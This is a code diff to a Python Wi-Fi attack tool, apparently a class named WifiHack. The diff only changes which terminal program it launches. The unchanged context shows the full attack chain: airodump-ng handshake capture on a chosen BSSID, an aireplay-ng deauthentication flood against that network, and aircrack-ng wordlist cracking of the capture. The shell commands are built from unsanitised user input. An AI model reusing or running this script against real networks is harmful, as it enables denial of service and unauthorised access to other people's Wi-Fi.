@@ -24,7 +24,7 @@ class WifiHack():
         print(adapter)
         self.getting_adapter = str(input("\n" + "Enter the adapter that is in monitor mode: "))
         first_command = f'airodump-ng {self.getting_adapter}'
-        subprocess.Popen(["x-terminal-emulator", "-e", f"bash -c '{first_command}; exec bash'"])
+        subprocess.Popen(["qterminal", "-e", f"bash -c '{first_command}; exec bash'"])
 
     def capture_handshake(self):
         print("")
@@ -32,15 +32,15 @@ class WifiHack():
         channel = str(input("Enter the channel of the BSSID network (ch):"))
         self.savefile = str(input("\n" + "Provide a unique output capture file name that hasn't been used before : "))
         cmd = f'airodump-ng --bssid {self.bssid} -c {channel} --write {self.savefile} {self.getting_adapter}'
-        subprocess.Popen(["x-terminal-emulator", "-e", f"bash -c '{cmd}; exec bash'"])
+        subprocess.Popen(["qterminal", "-e", f"bash -c '{cmd}; exec bash'"])
 
     def deauth_attack(self):
         d_cmd = f'aireplay-ng --deauth 90 -a {self.bssid} {self.getting_adapter}'
-        deauth_d = subprocess.Popen(["x-terminal-emulator", "-e", f"bash -c '{d_cmd}; exec bash'"])
+        deauth_d = subprocess.Popen(["qterminal", "-e", f"bash -c '{d_cmd}; exec bash'"])
         time.sleep(40)
         wordlist = str(input("\n" + "Enter the wordlist to crack the password: : "))
         p_cmd = f'aircrack-ng -w {wordlist} -b {self.bssid} {self.savefile}-01.cap'
-        print(subprocess.Popen(["x-terminal-emulator", "-e", f"bash -c '{p_cmd}; exec bash'"]))
+        print(subprocess.Popen(["qterminal", "-e", f"bash -c '{p_cmd}; exec bash'"]))
 
     def disable_monitor_mode(self):
         print("\n" + "Exiting monitor mode...")
